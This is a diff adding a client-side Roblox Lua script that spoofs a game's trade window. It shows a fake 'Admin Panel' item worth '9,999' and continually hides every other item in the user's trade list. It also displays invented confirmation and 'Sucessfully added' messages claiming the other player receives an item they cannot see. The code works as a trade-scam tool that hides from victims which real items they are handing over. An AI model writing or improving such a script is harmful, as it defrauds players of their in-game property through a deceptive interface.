@@ -1,0 +1,226 @@
+-- SERVICES
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local tradeUI = playerGui:WaitForChild("TradeLiveTrade"):WaitForChild("TradeLiveTrade")
+local yourFrame = tradeUI:WaitForChild("Your")
+local scrollingFrame = yourFrame:WaitForChild("ScrollingFrame")
+
+local template = scrollingFrame:WaitForChild("Template")
+local spacer = template:WaitForChild("Spacer")
+
+template.Visible = true
+
+local cash = spacer:WaitForChild("Cash")
+local title = spacer:WaitForChild("Title")
+local stroke = spacer:FindFirstChildOfClass("UIStroke")
+
+local confirmationUI = playerGui:WaitForChild("Confirmation")
+local warningTemplate = confirmationUI:WaitForChild("WarningTemplate")
+
+local content = warningTemplate:WaitForChild("Content")
+local description = content:WaitForChild("Description")
+
+local yesButton = warningTemplate:WaitForChild("Yes")
+local noButton = warningTemplate:WaitForChild("No")
+
+local notificationRoot = playerGui:WaitForChild("Notification")
+local notificationUI = notificationRoot:WaitForChild("Notification")
+
+local notifTemplate = notificationUI:FindFirstChild("Template")
+if not notifTemplate then
+	notifTemplate = notificationUI:WaitForChild("Template", 5)
+end
+
+local defaultColor = Color3.fromRGB(35, 45, 50)
+local clickedColor = Color3.fromRGB(15, 50, 15)
+local strokeClickedColor = Color3.fromRGB(15, 255, 15)
+
+cash.Text = "9,999"
+title.Text = "[🎁] Admin Panel"
+
+description.Text =
+"The other player will not see this item in the trade but will still receive the item. Do you still want to add this item to the trade?"
+
+if not spacer:FindFirstChild("CustomImage") then
+	local image = Instance.new("ImageLabel")
+	image.Name = "CustomImage"
+	image.Parent = spacer
+	image.BackgroundTransparency = 1
+	image.Image = "rbxassetid://139291316302932"
+	image.Size = UDim2.new(0.5, 0, 0.5, 0)
+	image.Position = UDim2.new(0.25, 0, 0.25, 0)
+end
+
+local existingTemplateImage = template:FindFirstChild("CustomImage")
+if existingTemplateImage then
+	existingTemplateImage:Destroy()
+end
+
+local function enforceVisibility()
+	for _, v in ipairs(scrollingFrame:GetChildren()) do
+		if v ~= template and v:IsA("GuiObject") then
+			v.Visible = false
+
+			v:GetPropertyChangedSignal("Visible"):Connect(function()
+				if v.Visible then
+					v.Visible = false
+				end
+			end)
+		end
+	end
+end
+
+enforceVisibility()
+
+scrollingFrame.ChildAdded:Connect(function()
+	task.wait()
+	enforceVisibility()
+end)
+
+task.spawn(function()
+	while true do
+		enforceVisibility()
+		task.wait(0.05)
+	end
+end)
+
+spacer.BackgroundColor3 = defaultColor
+if stroke then
+	stroke.Color = Color3.fromRGB(0, 0, 0)
+end
+
+local clicked = false
+
+local function showNotification(text, color)
+	local template = notificationRoot:WaitForChild("Notification"):WaitForChild("Template")
+
+	local clone = template:Clone()
+	clone.Parent = notificationUI
+	clone.Visible = true
+
+	local txt = nil
+
+	if clone:IsA("TextLabel") then
+		txt = clone
+	else
+		txt = clone:FindFirstChild("Text", true)
+
+		if not txt then
+			for _, v in ipairs(clone:GetDescendants()) do
+				if v:IsA("TextLabel") then
+					txt = v
+					break
+				end
+			end
+		end
+	end
+
+	if txt then
+		txt.Text = text
+		txt.TextColor3 = color
+	end
+
+	task.delay(5, function()
+		if clone then
+			clone:Destroy()
+		end
+	end)
+end
+
+local yesSound = Instance.new("Sound")
+yesSound.SoundId = "rbxassetid://83245966620103"
+yesSound.Volume = 0.5
+yesSound.Parent = warningTemplate
+
+local clickSound = Instance.new("Sound")
+clickSound.SoundId = "rbxassetid://75311202481026"
+clickSound.Volume = 1
+clickSound.Parent = spacer
+
+local failSound = Instance.new("Sound")
+failSound.SoundId = "rbxassetid://126210834885859"
+failSound.Volume = 0.5
+failSound.Parent = warningTemplate
+
+spacer.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		confirmationUI.Enabled = true
+		warningTemplate.Visible = true
+
+		if clickSound then
+			clickSound:Play()
+		end
+	end
+end)
+
+yesButton.MouseButton1Click:Connect(function()
+	warningTemplate.Visible = false
+	confirmationUI.Enabled = false
+
+	if yesSound then
+		yesSound:Play()
+	end
+
+	clicked = true
+	spacer.BackgroundColor3 = clickedColor
+
+	if stroke then
+		stroke.Color = strokeClickedColor
+	end
+
+	showNotification(
+		"Sucessfully added 'Admin Panel' to trade!",
+		Color3.fromRGB(0, 255, 0)
+	)
+end)
+
+noButton.MouseButton1Click:Connect(function()
+	warningTemplate.Visible = false
+	confirmationUI.Enabled = false
+
+	if failSound then
+		failSound:Play()
+	end
+
+	local failClone = notifTemplate and notifTemplate:Clone()
+
+	if not failClone then
+		warn("Template missing for fail notification")
+		return
+	end
+
+	failClone.Name = "Fail"
+	failClone.Parent = notificationUI
+	failClone.Visible = true
+
+	local txt = nil
+
+	if failClone:IsA("TextLabel") then
+		txt = failClone
+	else
+		txt = failClone:FindFirstChild("Text", true)
+	end
+
+	if txt then
+		txt.Text = "Failed to add 'Admin Panel' to trade!"
+		txt.TextColor3 = Color3.fromRGB(255, 0, 0)
+	end
+
+	task.delay(5, function()
+		if failClone then
+			failClone:Destroy()
+		end
+	end)
+end)
+
+tradeUI:GetPropertyChangedSignal("Visible"):Connect(function()
+	if not tradeUI.Visible then
+		clicked = false
+		spacer.BackgroundColor3 = defaultColor
+
+		if stroke then
+			stroke.Color = Color3.fromRGB(0, 0, 0)
+		end
+	end
+end)
